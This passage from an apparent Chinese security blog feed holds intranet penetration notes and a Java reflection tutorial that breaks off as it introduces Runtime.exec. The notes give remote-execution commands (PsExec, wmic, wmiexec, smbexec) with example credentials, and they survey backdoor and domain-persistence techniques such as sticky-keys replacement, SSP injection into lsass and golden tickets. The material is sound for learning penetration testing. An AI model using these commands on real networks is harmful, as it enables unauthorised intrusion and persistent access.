class="hljs-selector-class">.17</span> <span class="hljs-selector-tag">-s</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-tag">-accepteula</span> 使用该参数就不会弹出确认框<br><span class="hljs-selector-tag">-s</span> 以<span class="hljs-selector-tag">System</span>权限获取交互式的<span class="hljs-selector-tag">shell</span>，如果不加就会获得一个<span class="hljs-selector-tag">Administrator</span>的<span class="hljs-selector-tag">shell</span><br></code></pre></td></tr></table></figure></li><li><p>未建立<code>ipc$</code></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe<br><br>PsExec.exe \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> -u administrator -p password cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span> 执行命令<br></code></pre></td></tr></table></figure></li></ol><p><strong>注意</strong></p><ul><li>远程系统默认开启<code>admin$</code>共享（默认是开启的）</li><li>使用过程中会留下大量日志需要注意</li><li>MSF也有PsExec的相应模块提供使用</li></ul><h5 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h5><p><code>WMI(Windows Management Instrumentation)</code>，它是由一系列工具集组成的，可以从本地或者远程管理计算机系统，从Windows 98开始，windows操作系统都支持WMI。WMI的操作默认不会产生日志。</p><p><strong>基本命令</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic /node:192.168.1.17 /user:administrator /password:PassWord process call create <span class="hljs-string">&quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span>  将执行结果保存在C盘中<br><br>type \\192.168.1.17\C$\ip.txt  建立ipc$后，使用type命令读取结果<br></code></pre></td></tr></table></figure><p>wmic执行远程命令，在远程系统中启动WMI服务（服务端口为135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标系统有防火墙就无法连接，wmic就无法连接，wmic命令没有回显，需要使用<code>ipc$</code>和type命令来读取信息，如果wmic执行的是恶意程序也不会留下日志。</p><p><strong>impacket工具包中的wmiexecc</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">wmiexec.py administrator:<span class="hljs-symbol">Password@</span><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br></code></pre></td></tr></table></figure><p>主要用于Linux相关</p><p><strong>wmiexec.vbs</strong></p><p><code>wmiexec.vbs</code>脚本是通过VBS调用WMI来模拟PsExec的功能，可以在远程系统中执行命令并进行回显，获得半交互式shell</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">cscript.exe</span> <span class="hljs-string">//nologo</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/shell</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-comment"># 建立半交互式shell</span><br><span class="hljs-string">cscript.exe</span> <span class="hljs-string">wmiexec.vbs</span> <span class="hljs-string">/cmd</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span> <span class="hljs-string">administrator</span> <span class="hljs-string">PassWord</span> <span class="hljs-string">&quot;ipconfig&quot;</span> <span class="hljs-comment"># 执行单条命令</span><br></code></pre></td></tr></table></figure><p>对于一些运行时间较长的命令，需要添加<code>-wait 5000</code> 或者更长的时间参数；在运行nc这种不需要输出结果但是需要一直运行的命令时，使用<code>-persist</code>参数，就不需要使用<code>taskkill</code>命令来远程结束进程</p><blockquote><p>已经被许多杀软列入黑名单</p></blockquote><p><strong>Invoke-WmiCommand</strong></p><p><code>Invoke-WmiCommand.ps1</code>脚本包含在<code>PowerSploit</code>工具包中，它通过<code>Powershell</code>调用WMI来远程执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 目标系统用户名</span><br>$User=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># 目标系统密码</span><br>$Password= ConvertTo-SecureString -<span class="hljs-keyword">String</span> <span class="hljs-string">&quot;Password&quot;</span> -AsPlainText -Force<br><span class="hljs-comment"># 将账号和密码整合起来</span><br>$Cred= <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password<br><span class="hljs-comment"># 远程执行命令</span><br>$Remote=Invoke-WmiComand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.17</span><br><span class="hljs-comment"># 将执行结果输出到屏幕</span><br>$Remote.PayloadOutput<br></code></pre></td></tr></table></figure><p><strong>Invoke-WMIMethod</strong></p><p>利用<code>Powershell</code>自带的<code>Invoke-WMIMethod</code>可以在远程执行命令和指定程序，在Powershell命令行环境中执行如下命令，可以以非交互式的方法执行命令，但是不会回显结果</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 目标系统用户名</span><br><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;lcdm123\administrator&quot;</span><br><span class="hljs-comment"># 目标系统密码</span><br><span class="hljs-variable">$Password</span>= <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-comment"># 将账号和密码整合起来</span><br><span class="hljs-variable">$Cred</span>= <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><span class="hljs-comment"># 在远程系统中运行计算机程序</span><br><span class="hljs-built_in">Invoke-WMIMethod</span> <span class="hljs-literal">-Class</span> Win32_Process <span class="hljs-literal">-Name</span> Create <span class="hljs-literal">-ArgumenList</span> <span class="hljs-string">&quot;cacl.exe&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.1.17&quot;</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><h5 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h5><blockquote><p>使用smbexec时目标系统的共享必须开放（C$  ipc$ admin$）</p></blockquote><p><strong>C++版的smbexec</strong></p><p>test.exe 客户端主程序</p><p>execserver.exe 目标系统中的辅助程序</p><p>常用命令<code>test.exe ip username password  command netshare</code></p><p>使用</p><ul><li><p>将exeserver.exe上传到目标系统的C:\Windows目录下，解除UAC对命令执行的限制</p><p><code>net use \\192.168.1.17 &quot;Password&quot; /user:lcdm123\administrator</code></p></li><li><p>在客户端执行</p><p><code>test.exe 192.168.1.17 administrator Password whoami c$</code></p></li></ul><p><strong>impacket工具包中的smbexec.py</strong></p><p><code>smbexec.py lcdm123/administrator:password@192.168.1.17</code></p><p><strong>DCOM在远程系统中的使用</strong></p><blockquote><p>DCOM（分布式组件对象模型）时微软的一系列概念和程序接口，通过DCOM客户端程序对象能够向网络中的另一台计算机上的服务程序对象发送请求</p><p>DCOM是基于组件对象模型（COM）的，COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口</p></blockquote><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h5><ul><li><p>粘滞建后门</p><p>使用后门程序替换<code>windows\system32</code>下的<code>sethc.exe</code>文件</p></li><li><p>注册表后门</p><p>在普通用户权限下，攻击者将需要执行的后门程序或者而脚本路径填写到注册表键<code>HACK:Software\Microsoft\Windows\CurrentVersion\Run</code>中（键名任意）</p></li><li><p>计划任务后门</p><ul><li>MSF中模拟计划任务后门</li><li>PowerShell中模拟计划任务后门</li><li>Empire中模拟计划任务后门</li></ul></li><li><p>meterpreter后门</p><p>persistence是meterpreter自带的后门程序，是一个使用安装自启动方式的持久性后门程序</p></li><li><p>Cymothoa后门</p><p>Cymothoa是一款可以将shellcode注入先后进程（插进程）的后门工具</p></li><li><p>WMI型后门</p><p>WMI型后门只能由具有管理员权限的用户运行，WMI型后门通常是由Powershell编写的，可以直接从新的WMI属性中读取和执行后门代码，给代码加密，通过这种方法，攻击者可以在系统中安装一个具有持久性的后门并且不会再系统磁盘中留下任何文件</p><p>WMI型后门使用了WMI的两个特征：无文件和无进程，基本原理是将代码加密存储再WMI中，达到所谓的无文件；当设定的条件被满足时系统将启动Powershell进程去执行后门程序，执行后进程将消失（时间根据后门的运行情况而定）达到所谓的无进程</p></li></ul><h5 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h5><blockquote><p>这个感觉就是比平时一句话木马差不多的后门</p></blockquote><ul><li>Nishang下的webshell</li><li>weevely后门</li><li>webacoo后门</li><li>MSF中的ASPX，PHP后门</li><li>………………</li></ul><h5 id="域控制器权限持久化"><a href="#域控制器权限持久化" class="headerlink" title="域控制器权限持久化"></a>域控制器权限持久化</h5><ul><li><p>DSRM域后门</p><p>DSRM（目录服务恢复模式）是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账户（DSRM账户）</p><p>DSRM的用途：允许管理员再域环境中出现故障或崩溃时还原，修复，重建活动目录数据库</p><p>渗透测试中可以使用DSRM账户对域环境进行持久化操作，如果域控版本为win server 2008 需要安装KB961320才可以使用指定域账户的密码对DSRM进行同步，再之后的版本不需要安装，如果是Windows server 2003则不能使用这个方法进行持久化</p></li><li><p>SSP维持域控权限</p><p>简单SSP就是一个DLL文件，主要用来实现Windows操作系统的身份认证功能，例如NTLM，kerberos等</p><p>SSPI（安全支持提供程序接口）是windows操作系统在执行操作时使用的API接口，可以说SSPI是SSP的API接口</p><p>SSP持久化操作的原理：LSA用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略，在启动时，SSP将被加载到lsass.exe进程中，但是假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就可以获得lsass.exe进程中的明文密码，这样即使用户更改密码并重新登录，攻击者依然能获取到明文密码。</p></li><li><p>SID History域后门</p><p>每个用户都有自己的SID，SID的作用就是跟踪安全主体控制用户连接资源时的访问权限，SID History是域迁移过程中需要使用的一个属性。</p><p><strong>SID History的作用就是在域迁移的过程中保持域用户的访问权限</strong>，即如果钱以后用户的SID改变了，系统将其原来的SID添加到钱以后用户的SID History中，使迁移后的用户保持原有的权限，能够访问原来可以访问的资源。</p></li><li><p>黄金票据</p><p>假设域内存在一个SID为502的域账户为krbtgt，它是KDC服务使用的账户，属于Domain Admins组，域环境中，每个用户账户的票据都是由krbtgt生成的，如果拿到了krbtgt的NTLM Hash 或者 AES-256值就可以伪造域内任意用户的身份访问其他服务</p><p>使用黄金票据进行票据传递攻击时需要的信息：</p><ul><li>完整的域名</li><li>域SID</li><li>krbtgt的NTLM Hash 或 AES-256值</li><li>需要伪造的域管理员用户名</li></ul></li><li><p>白银票据</p><p>不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问服务的TGT，因为票据生成的过程中不会使用所以可以绕过域控，很少留下日志。白银票据依赖于服务账户的密码散列值，通过相应的服务账号来伪造TGS，例如 LDAP，MSSQL，DNS等，范围有限只能获取对应服务的权限。</p><p>黄金票据是由krbtgt账号加密的，白银票据是由特定的服务账号加密的</p><p>白银票据攻击时需要的信息：</p><ul><li>域名</li><li>域SID</li><li>目标服务器的FQDN</li><li>可利用的服务</li><li>服务账户的NTLM Hash</li><li>需要伪造的用户名</li></ul></li><li><p>Skeleton Key</p><p>使用Skeleton Key （万能密码），可以对域内权限进行持久化操作，可以使用mimikatz和Emoire的操作将Skeleton Key注入lsass.exe中</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射</title>
    <link href="/2021/10/12/Java%E5%8F%8D%E5%B0%84/"/>
    <url>/2021/10/12/Java%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h1><h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性（包括私有的方法和属性）。</p><ol><li>Java反射机制的核心是再程序运行时动态加载类并获取类的详细信息，从而操作类或者对象的属性和方法。本质时JVM得到Class对象进行反编译，从而获取对象的各种信息。</li><li>Java属于先编译再运行的语言，程序中对象的类型再编译期就确定下来了，而当程序再运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以再运行的时候动态创建对象并调用其属性，不需要提前再编译期就知道运行的对象是谁。</li></ol><h2 id="反射常用的类"><a href="#反射常用的类" class="headerlink" title="反射常用的类"></a>反射常用的类</h2><ul><li><code>Java.lang.Class</code>  代表类</li><li><code>Java.lang.reflect.Constructor</code>  代表类的构造方法</li><li><code>Java.lang.reflect.Field</code>  代表类的属性</li><li><code>Java.lang.reflect.Method </code> 代表类的方法</li><li><code>Java.lang.reflect.Modifier </code> 代表类，方法，属性的描述修饰符</li></ul><h2 id="测试练习"><a href="#测试练习" class="headerlink" title="测试练习"></a>测试练习</h2><p><strong>测试类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> </span>&#123;<br><span class="hljs-comment">//    私有变量</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> String addr;<br><span class="hljs-comment">//    构造函数</span><br>    People(String name, <span class="hljs-keyword">int</span> age, String addr)&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>        <span class="hljs-keyword">this</span>.addr = addr;<br>    &#125;<br><span class="hljs-comment">//    设置参数</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAddr</span><span class="hljs-params">(String addr)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.addr = addr;<br>    &#125;<br><span class="hljs-comment">//    获取变量值</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAddr</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.addr;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Name:&quot;</span> + <span class="hljs-keyword">this</span>.name);<br>        System.out.println(<span class="hljs-string">&quot;Age:&quot;</span> + <span class="hljs-keyword">this</span>.age);<br>        System.out.println(<span class="hljs-string">&quot;Addr:&quot;</span> + <span class="hljs-keyword">this</span>.addr);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>创建了一个简单的测试People类</p></blockquote><p><strong>获取到类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br><br>        People p1 = <span class="hljs-keyword">new</span> People(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br><br>        Class p2 = People.class;<br><br>        Class p3 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        Class p4 = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;p1:&quot;</span> + p1);<br><br>        System.out.println(<span class="hljs-string">&quot;p2:&quot;</span> + p2);<br><br>        System.out.println(<span class="hljs-string">&quot;p3:&quot;</span> + p3);<br><br>        System.out.println(<span class="hljs-string">&quot;p4:&quot;</span> + p4);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011212404093.png" alt="image-20211011212404093"></p><p>以上四种通过不同的方式都成功创建类People类</p><p>第一种方法直接创建对象，没有使用反射；第二种是利用现有类获取类；第三种是靠写入包路径参数获取到类；第四种就是利用<code>ClassLoader</code> 的方法获取类</p><blockquote><p>上面的方法的区别就是是否会对类初始化</p></blockquote><p><strong>创建实例</strong></p><ol><li><p>直接使用<code>Class</code>对象的<code>newInstance()</code>方法来创建<code>Class</code>对应的实例</p></li><li><p>先通过<code>Class</code>对象获取指定的<code>Constructor</code>对象，再调用<code>Constructor</code>对象的<code>newInstance()</code>创建对象</p><blockquote><p>第一种只能使用默认的无参构造，第二种可以指定类构造器</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br><span class="hljs-comment">//        获取类</span><br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><span class="hljs-comment">//        实例化类</span><br><span class="hljs-comment">//        默认无参构造器(需要类有无参构造函数)</span><br>        People people1 = (People) p1.newInstance();<br><span class="hljs-comment">//        指定类构造器</span><br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;----------&quot;</span>);<br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people2 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people2.getAll();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011220423307.png" alt="image-20211011220423307"></p><p><code>getConstructors()</code>：所有”公有的”构造方法</p><p><code>getDeclaredConstructors()</code>：获取所有的构造方法(包括私有、受保护、默认、公有)</p><p><strong>获取成员属性并修改</strong></p><p><code>getFileds()</code> 获取类的所有public属性</p><p><code>getDeclaredFileds()</code> 获取类的所有public属性</p><p><code>getFiled(String name)</code>：特定的Public属性</p><p><code>getDeclaredFiled(String name)</code>: 获取类的特定属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people1 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br>        Field[] fields = p1.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field f:fields)&#123;<br>            System.out.println(f);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;----------------&quot;</span>);<br>        Field field = p1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(field);<br>        System.out.println(<span class="hljs-string">&quot;------------&quot;</span>);<br><span class="hljs-comment">//        解除私有参数限定</span><br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(people1, <span class="hljs-string">&quot;test&quot;</span>);<br>        people1.getAll();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011222341138.png" alt="image-20211011222341138"></p><blockquote><p>获取单个的类成员变量，依然使用的是前面的数据类型是Filed，修改成员变量的时候，使用set函数，如果是修改私有成员变量需要先使用<code>setAccessible(true)</code>函数，然后使用 <code>set</code> 函数来设置变量的值</p><p>通过反射可以直接修改类的私有成员变量</p></blockquote><p><strong>获取成员方法并调用</strong></p><p><code>getMethods()</code>：获取所有Public成员方法</p><p><code>getDeclaredMethods()</code> ：获取所有成员方法</p><p><code>getMethod()</code> ：获取特定Public成员方法</p><p><code>getDeclaredMethod()</code> ： 获取特定成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people1 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;-------------&quot;</span>);<br>        Method[] methods = p1.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span>(Method m:methods)&#123;<br>            System.out.println(m);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;-------------&quot;</span>);<br>        Method method = p1.getMethod(<span class="hljs-string">&quot;setAge&quot;</span>, <span class="hljs-keyword">int</span>.class);<br>        method.invoke(people1,<span class="hljs-number">20</span>);<br>        people1.getAll();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011224303903.png" alt="image-20211011224303903"></p><blockquote><p>获取单个类函数时，在其后面加上 参数类型.class ，后面使用invoke调用函数时，参数为实例化类的名字，和函数的参数。如果函数是私有的可以使用<code>setAccessible(true)</code>，解除私有限定</p><p>最后使用 <code>invoke()</code> 来调用函数，第一个参数是所选的类，后面的参数就是给函数传的参数</p><p>这里感觉这个的作用就是拿来调用类中的私有方法</p></blockquote><h2 id="Runtime-类的使用"><a href="#Runtime-类的使用" class="headerlink" title="Runtime 类的使用"></a>Runtime 类的使用</h2><blockquote><p><code>java.lang.Runtime</code> 中有一个 <code>exec</code> 方法可以执行本地命令，所以经常被在各种<code>payload</code>中</p></blockquote><p><code>Runtime</code> 类的构造函数有点特别，它的空构造函数是私有的（在IDEA中可以直接按 F4 查看类源码）</p><p><img 